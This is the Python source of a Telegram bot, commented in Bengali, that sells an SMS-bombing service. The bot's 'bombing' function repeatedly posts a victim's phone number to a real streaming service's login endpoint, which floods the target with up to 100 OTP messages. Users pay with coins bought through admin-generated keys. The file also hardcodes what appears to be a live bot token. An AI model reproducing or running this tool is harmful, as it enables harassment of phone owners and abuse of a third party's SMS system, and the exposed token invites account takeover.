import telebot
import requests
import json
import os
import time
import threading
import random
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- পাওয়ারফুল ডেটাবেস সিস্টেম ---
# এটি নিশ্চিত করে যে প্রতিবার ডেটা পরিবর্তন হলে তা ফাইলটিতে সেভ হবে।

def load_db(filename):
    if not os.path.exists(filename):
        with open(filename, 'w') as f:
            json.dump({}, f)
        return {}
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"Error loading {filename}: {e}")
        return {}

def save_db(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Error saving {filename}: {e}")

# গ্লোবাল ভেরিয়েবল হিসেবে ডাটাবেস লোড
users_db = load_db('users.json')
keys_db = load_db('keys.json')

# --- ইউজার রেজিস্ট্রেশন ও আপডেট ফাংশন ---
def update_user(user):
    uid = str(user.id)
    name = user.first_name if user.first_name else "No Name"
    username = f"@{user.username}" if user.username else "N/A"
    
    # যদি নতুন ইউজার হয়
    if uid not in users_db:
        users_db[uid] = {
            "id": uid,
            "name": name,
            "username": username,
            "status": "Free",
            "coins": 30, # প্রাথমিক গিফট কয়েন
            "total_sent": 0,
            "last_key_used": "None",
            "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    else:
        # পুরনো ইউজারের তথ্য আপডেট (নাম বা ইউজারনেম পরিবর্তন করলে)
        users_db[uid]["name"] = name
        users_db[uid]["username"] = username
        users_db[uid]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    save_db('users.json', users_db) # সাথে সাথে ফাইলে সেভ হবে
    return users_db[uid]

# --- ভেরিফিকেশন ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- মেনু ডিজাইন ---
def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Recharge", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}")
    )
    return markup

# --- স্টার্ট কমান্ড ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    u = update_user(message.from_user)
    
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("✅ Check Joined", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Verification Required!**\nPlease join our channel to use this bot.", reply_markup=markup)
        return

    welcome_txt = (f"👋 **Welcome Back, {u['name']}!**\n\n"
                  f"💰 Balance: `{u['coins']}` Coins\n"
                  f"🚀 Total Sent: `{u['total_sent']}` SMS\n"
                  f"🛡️ Account Type: `{u['status']}`\n\n"
                  "আপনার অ্যাকাউন্টের সকল তথ্য সংরক্ষিত রয়েছে।")
    bot.send_photo(message.chat.id, LOGO_URL, caption=welcome_txt, reply_markup=get_main_markup())

# --- কলব্যাক হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def callback_logic(call):
    uid = str(call.from_user.id)
    u = update_user(call.from_user)

    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Success!")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_cmd(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Please Join First!", show_alert=True)

    elif call.data == "profile":
        text = (f"👤 **Your Stats**\n"
                f"━━━━━━━━━━━━\n"
                f"🆔 ID: `{uid}`\n"
                f"💰 Balance: `{u['coins']}`\n"
                f"🚀 Sent: `{u['total_sent']}`\n"
                f"🔑 Last Key: `{u['last_key_used']}`\n"
                f"🏆 Status: `{u['status']}`")
        bot.send_message(call.message.chat.id, text)

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **Enter Your Secret Key:**")
        bot.register_next_step_handler(msg, process_recharge)

    elif call.data == "bomb":
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number (11 Digit):**")
        bot.register_next_step_handler(msg, get_number)

# --- রিচার্জ লজিক (Key System) ---
def process_recharge(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    
    if key in keys_db:
        val = keys_db[key]
        if val == "lifetime":
            users_db[uid]['status'] = "Premium"
        else:
            users_db[uid]['coins'] += int(val)
        
        users_db[uid]['last_key_used'] = key
        del keys_db[key] # কি একবার ব্যবহার হলে মুছে যাবে
        
        save_db('keys.json', keys_db)
        save_db('users.json', users_db)
        bot.send_message(message.chat.id, f"✅ **Recharge Successful!**\nNew Balance: `{users_db[uid]['coins']}`")
    else:
        bot.send_message(message.chat.id, "❌ **Invalid Key!** Please contact admin.")

# --- এসএমএস বোম্বিং ইঞ্জিন ---
def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else: bot.send_message(message.chat.id, "❌ Invalid Number!")

def start_attack(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = amount * 1 # প্রতি এসএমএস ১ কয়েন
        
        if users_db[uid]['status'] != 'Premium' and users_db[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ Low Coins! Need {cost} coins.")
            return

        p_msg = bot.send_message(message.chat.id, "🚀 **Initializing Attack...**")
        threading.Thread(target=bombing, args=(uid, num, amount, cost, p_msg)).start()
    except: bot.send_message(message.chat.id, "❌ Error!")

def bombing(uid, num, amount, cost, p_msg):
    success = 0
    # API: Bioscope
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    
    for i in range(1, amount + 1):
        try:
            r = requests.post(url, json={"number": "+88"+num}, timeout=5)
            if r.status_code == 200: success += 1
            if i % 10 == 0:
                bot.edit_message_text(f"🚀 **Bombing {num}...**\nProgress: `{i}/{amount}`", p_msg.chat.id, p_msg.message_id)
            time.sleep(0.5)
        except: pass

    # কয়েন ও ডেটা আপডেট (খুব গুরুত্বপূর্ণ)
    if users_db[uid]['status'] != 'Premium':
        users_db[uid]['coins'] -= cost
    users_db[uid]['total_sent'] += success
    save_db('users.json', users_db) # ডেটাবেসে স্থায়ীভাবে সেভ

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔄 Repeat Attack", callback_data="bomb"))
    bot.edit_message_text(f"✅ **Attack Finished!**\n🎯 Target: `{num}`\n🚀 Successful: `{success}`\n💰 Balance Deducted: `{cost}` Coins", p_msg.chat.id, p_msg.message_id, reply_markup=markup)

# --- অ্যাডমিন কন্ট্রোলস ---
@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        # /gen 500
        val = message.text.split()[1]
        k = "DU-" + os.urandom(3).hex().upper()
        keys_db[k] = val
        save_db('keys.json', keys_db)
        bot.reply_to(message, f"🔑 **Key:** `{k}`\n**Value:** {val}")
    except: bot.reply_to(message, "Usage: `/gen 500` or `/gen lifetime`")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    total_users = len(users_db)
    bot.send_message(message.chat.id, f"👑 **Admin Dashboard**\n\n👥 Total Users: {total_users}\n💾 Database Status: `Stable ✅`")

# --- বোট চালানো ---
if __name__ == "__main__":
    print(f"Bot started as Admin ID: {ADMIN_ID}")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            time.sleep(5)
